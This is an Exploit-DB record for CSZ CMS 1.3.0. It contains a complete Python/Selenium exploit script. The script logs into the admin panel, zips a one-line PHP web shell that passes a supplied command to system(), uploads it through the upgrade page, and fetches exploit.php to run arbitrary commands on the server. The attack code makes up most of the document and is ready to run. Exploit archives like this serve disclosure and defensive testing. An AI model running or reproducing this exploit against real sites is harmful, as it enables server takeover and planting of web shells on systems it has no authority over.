{"source": "https://www.exploit-db.com/exploits/51863", "vulnName": "CSZ CMS Version 1.3.0 - Authenticated Remote Command Execution", "vulnEDBID": "51863", "vulnCVE": "N/A", "author": "TMRSWRR", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-06", "vulnContent": "# Exploit Title: CSZ CMS Version 1.3.0 Remote Command Execution\n# Date: 17/11/2023\n# Exploit Author: tmrswrr\n# Vendor Homepage: https://www.cszcms.com/\n# Software Link: https://www.cszcms.com/link/3#https://sourceforge.net/projects/cszcms/files/latest/download\n# Version: Version 1.3.0\n# Tested on: https://www.softaculous.com/apps/cms/CSZ_CMS\n\n\nimport os\nimport zipfile\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.firefox.options import Options as FirefoxOptions\nfrom selenium.webdriver.firefox.service import Service as FirefoxService\nfrom webdriver_manager.firefox import GeckoDriverManager\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.common.exceptions import NoSuchElementException, TimeoutException\nimport requests\nfrom time import sleep\nimport sys\nimport random\nimport time\nimport platform\nimport tarfile\nfrom io import BytesIO\n\nemail = \"admin@admin.com\" \npassword = \"password\"\n\nclass colors:\n    OKBLUE = '\\033[94m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n    CBLACK = '\\33[30m'\n    CRED = '\\33[31m'\n    CGREEN = '\\33[32m'\n    CYELLOW = '\\33[33m'\n    CBLUE = '\\33[34m'\n    CVIOLET = '\\33[35m'\n    CBEIGE = '\\33[36m'\n    CWHITE = '\\33[37m'\n\n\ncolor_random = [colors.CBLUE, colors.CVIOLET, colors.CWHITE, colors.OKBLUE, colors.CGREEN, colors.WARNING,\n                colors.CRED, colors.CBEIGE]\nrandom.shuffle(color_random)\n\n\ndef entryy():\n    x = color_random[0] + \"\"\"\n\n\u256d\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u256e\u256d\u2501\u2501\u2501\u2533\u2501\u256e\u256d\u2501\u2533\u2501\u2501\u2501\u256e\u256d\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u256e\u256d\u2501\u2501\u2501\u2533\u2501\u256e\u256d\u2501\u2533\u2501\u2501\u2501\u2533\u256e\u2571\u2571\u256d\u2501\u2501\u2501\u2533\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u256e\n\u2503\u256d\u2501\u256e\u2503\u256d\u2501\u256e\u2523\u2501\u2501\u256e\u2501\u2503\u2503\u256d\u2501\u256e\u2503\u2503\u2570\u256f\u2503\u2503\u256d\u2501\u256e\u2503\u2503\u256d\u2501\u256e\u2503\u256d\u2501\u256e\u2503\u256d\u2501\u2501\u256f\u2503\u256d\u2501\u2501\u253b\u256e\u2570\u256f\u256d\u252b\u256d\u2501\u256e\u2503\u2503\u2571\u2571\u2503\u256d\u2501\u256e\u2523\u252b\u2523\u252b\u256d\u256e\u256d\u256e\u2503\n\u2503\u2503\u2571\u2570\u252b\u2570\u2501\u2501\u256e\u2571\u256d\u256f\u256d\u256f\u2503\u2503\u2571\u2570\u252b\u256d\u256e\u256d\u256e\u2503\u2570\u2501\u2501\u256e\u2503\u2570\u2501\u256f\u2503\u2503\u2571\u2570\u252b\u2570\u2501\u2501\u256e\u2503\u2570\u2501\u2501\u256e\u2570\u256e\u256d\u256f\u2503\u2570\u2501\u256f\u2503\u2503\u2571\u2571\u2503\u2503\u2571\u2503\u2503\u2503\u2503\u2570\u256f\u2503\u2503\u2570\u256f\n\u2503\u2503\u2571\u256d\u254b\u2501\u2501\u256e\u2503\u256d\u256f\u256d\u256f\u2571\u2503\u2503\u2571\u256d\u252b\u2503\u2503\u2503\u2503\u2523\u2501\u2501\u256e\u2503\u2503\u256d\u256e\u256d\u252b\u2503\u2571\u256d\u252b\u256d\u2501\u2501\u256f\u2503\u256d\u2501\u2501\u256f\u256d\u256f\u2570\u256e\u2503\u256d\u2501\u2501\u252b\u2503\u2571\u256d\u252b\u2503\u2571\u2503\u2503\u2503\u2503\u2571\u2571\u2503\u2503\n\u2503\u2570\u2501\u256f\u2503\u2570\u2501\u256f\u2523\u256f\u2501\u2570\u2501\u256e\u2503\u2570\u2501\u256f\u2503\u2503\u2503\u2503\u2503\u2503\u2570\u2501\u256f\u2503\u2503\u2503\u2503\u2570\u252b\u2570\u2501\u256f\u2503\u2570\u2501\u2501\u256e\u2503\u2570\u2501\u2501\u2533\u256f\u256d\u256e\u2570\u252b\u2503\u2571\u2571\u2503\u2570\u2501\u256f\u2503\u2570\u2501\u256f\u2523\u252b\u2523\u256e\u2571\u2503\u2503\n\u2570\u2501\u2501\u2501\u253b\u2501\u2501\u2501\u253b\u2501\u2501\u2501\u2501\u256f\u2570\u2501\u2501\u2501\u253b\u256f\u2570\u256f\u2570\u253b\u2501\u2501\u2501\u256f\u2570\u256f\u2570\u2501\u253b\u2501\u2501\u2501\u253b\u2501\u2501\u2501\u256f\u2570\u2501\u2501\u2501\u253b\u2501\u256f\u2570\u2501\u253b\u256f\u2571\u2571\u2570\u2501\u2501\u2501\u253b\u2501\u2501\u2501\u253b\u2501\u2501\u256f\u2571\u2570\u256f\n\n                <<   CSZ CMS Version 1.3.0 RCE     >>\n                <<      CODED BY TMRSWRR           >>\n                <<     GITHUB==>capture0x          >>\n\n\\n\"\"\"\n    for c in x:\n        print(c, end='')\n        sys.stdout.flush()\n        sleep(0.0045)\n    oo = \" \" * 6 + 29 * \"\u2591\u28ff\" + \"\\n\\n\"\n    for c in oo:\n        print(colors.CGREEN + c, end='')\n        sys.stdout.flush()\n        sleep(0.0065)\n\n    tt = \" \" * 5 + \"\u2591\u28ff\" + \" \" * 6 + \"WELCOME TO CSZ CMS Version 1.3.0 RCE Exploit\" + \" \" * 7 + \"\u2591\u28ff\" + \"\\n\\n\"\n    for c in tt:\n        print(colors.CWHITE + c, end='')\n        sys.stdout.flush()\n        sleep(0.0065)\n    xx = \" \" * 6 + 29 * \"\u2591\u28ff\" + \"\\n\\n\"\n    for c in xx:\n        print(colors.CGREEN + c, end='')\n        sys.stdout.flush()\n        sleep(0.0065)\n\ndef check_geckodriver():\n    current_directory = os.path.dirname(os.path.abspath(__file__))\n    geckodriver_path = os.path.join(current_directory, 'geckodriver')\n\n    if not os.path.isfile(geckodriver_path):\n        red = \"\\033[91m\"\n        reset = \"\\033[0m\"\n        print(red + \"\\n\\nGeckoDriver (geckodriver) is not available in the script's directory.\" + reset)\n        user_input = input(\"Would you like to download it now? (yes/no): \").lower()\n        if user_input == 'yes':\n            download_geckodriver(current_directory)\n        else:\n            print(red + \"Please download GeckoDriver manually from: https://github.com/mozilla/geckodriver/releases\" + reset)\n            sys.exit(1)\n\ndef download_geckodriver(directory):\n\n    print(\"[*] Detecting OS and architecture...\")\n    os_name = platform.system().lower()\n    arch, _ = platform.architecture()\n\n    if os_name == \"linux\":\n        os_name = \"linux\"\n        arch = \"64\" if arch == \"64bit\" else \"32\"\n    elif os_name == \"darwin\":\n        os_name = \"macos\"\n        arch = \"aarch64\" if platform.processor() == \"arm\" else \"\"\n    elif os_name == \"windows\":\n        os_name = \"win\"\n        arch = \"64\" if arch == \"64bit\" else \"32\"\n    else:\n        print(\"[!] Unsupported operating system.\")\n        sys.exit(1)\n\n    geckodriver_version = \"v0.33.0\"\n    geckodriver_file = f\"geckodriver-{geckodriver_version}-{os_name}{arch}\"\n    ext = \"zip\" if os_name == \"win\" else \"tar.gz\"\n    url = f\"https://github.com/mozilla/geckodriver/releases/download/{geckodriver_version}/{geckodriver_file}.{ext}\"\n\n    print(f\"[*] Downloading GeckoDriver for {platform.system()} {arch}-bit...\")\n    response = requests.get(url, stream=True)\n\n    if response.status_code == 200:\n        print(\"[*] Extracting GeckoDriver...\")\n        if ext == \"tar.gz\":\n            with tarfile.open(fileobj=BytesIO(response.content), mode=\"r:gz\") as tar:\n                tar.extractall(path=directory)\n        else:   \n            with zipfile.ZipFile(BytesIO(response.content)) as zip_ref:\n                zip_ref.extractall(directory)\n        print(\"[+] GeckoDriver downloaded and extracted successfully.\")\n    else:\n        print(\"[!] Failed to download GeckoDriver.\")\n        sys.exit(1)\n        \ndef create_zip_file(php_filename, zip_filename, php_code):\n    try:\n        with open(php_filename, 'w') as file:\n            file.write(php_code)\n        with zipfile.ZipFile(zip_filename, 'w') as zipf:\n            zipf.write(php_filename)\n        print(\"[+] Zip file created successfully.\")\n        os.remove(php_filename)\n        return zip_filename\n    except Exception as e:\n        print(f\"[!] Error creating zip file: {e}\")\n        sys.exit(1)\n\n\ndef main(base_url, command):\n\n    if not base_url.endswith('/'):\n        base_url += '/'\n        \n    zip_filename = None   \n\n    check_geckodriver()\n    try:\n        firefox_options = FirefoxOptions()\n        firefox_options.add_argument(\"--headless\")\n\n        script_directory = os.path.dirname(os.path.abspath(__file__))\n        geckodriver_path = os.path.join(script_directory, 'geckodriver')\n        service = FirefoxService(executable_path=geckodriver_path)\n        driver = webdriver.Firefox(service=service, options=firefox_options)\n        print(\"[*] Exploit initiated.\")\n\n        # Login\n        driver.get(base_url + \"admin/login\")\n        print(\"[*] Accessing login page...\")\n        driver.find_element(By.NAME, \"email\").send_keys(f\"{email}\")\n        driver.find_element(By.NAME, \"password\").send_keys(f\"{password}\")\n        driver.find_element(By.ID, \"login_submit\").click()\n        print(\"[*] Credentials submitted...\")\n\n \n        try:\n            error_message = driver.find_element(By.XPATH, \"//*[contains(text(), 'Email address/Password is incorrect')]\")\n            if error_message.is_displayed():\n                print(\"[!] Login failed: Invalid credentials.\")\n                driver.quit()\n                sys.exit(1)\n        except NoSuchElementException:\n            print(\"[+] Login successful.\")\n\n        # File creation  \n        print(\"[*] Preparing exploit files...\")\n        php_code = f\"<?php echo system('{command}'); ?>\"\n        zip_filename = create_zip_file(\"exploit.php\", \"payload.zip\", php_code)\n\n \n        driver.get(base_url + \"admin/upgrade\")\n        print(\"[*] Uploading exploit payload...\")\n        file_input = driver.find_element(By.ID, \"file_upload\")\n        file_input.send_keys(os.path.join(os.getcwd(), zip_filename))\n\n   # Uploading\n        driver.find_element(By.ID, \"submit\").click()\n        WebDriverWait(driver, 10).until(EC.alert_is_present())\n        alert = driver.switch_to.alert\n        alert.accept()\n\n        # Exploit result \n        exploit_url = base_url + \"exploit.php\"\n        response = requests.get(exploit_url)\n        print(f\"[+] Exploit response:\\n\\n{response.text}\")\n\n    except Exception as e:\n        print(f\"[!] Error: {e}\")\n    finally:\n        driver.quit()\n        if zip_filename and os.path.exists(zip_filename):\n            os.remove(zip_filename)\n\nif __name__ == \"__main__\":\n    entryy()\n    if len(sys.argv) < 3:\n        print(\"Usage: python script.py [BASE_URL] [COMMAND]\")\n    else:\n        main(sys.argv[1], sys.argv[2])\n            "}